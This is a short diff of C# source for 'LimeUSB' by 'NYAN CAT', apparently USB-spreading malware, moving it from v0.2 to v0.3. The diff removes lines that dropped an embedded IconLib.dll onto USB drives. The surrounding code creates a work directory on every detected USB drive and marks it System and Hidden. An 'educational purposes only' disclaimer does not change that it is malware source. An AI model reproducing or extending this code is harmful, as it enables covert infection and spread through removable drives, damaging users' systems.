@@ -12,7 +12,7 @@ using System.CodeDom.Compiler;
 
 //
 //       │ Author     : NYAN CAT
-//       │ Name       : LimeUSB v0.2
+//       │ Name       : LimeUSB v0.3
 
 //       Contact Me   : https://github.com/NYAN-x-CAT
 //       This program Is distributed for educational purposes only.
@@ -40,8 +40,6 @@ namespace LimeUSB_Csharp
                         if (!Directory.Exists(USB.RootDirectory.ToString() + Settings.WorkDirectory))
                         {
                             Directory.CreateDirectory(USB.RootDirectory.ToString() + Settings.WorkDirectory);
-                            if (!File.Exists(USB.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + "IconLib.dll"))
-                                File.WriteAllBytes(USB.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + "IconLib.dll", Properties.Resources.IconLib);
                             File.SetAttributes(USB.RootDirectory.ToString() + Settings.WorkDirectory, FileAttributes.System | FileAttributes.Hidden);
                         }
 
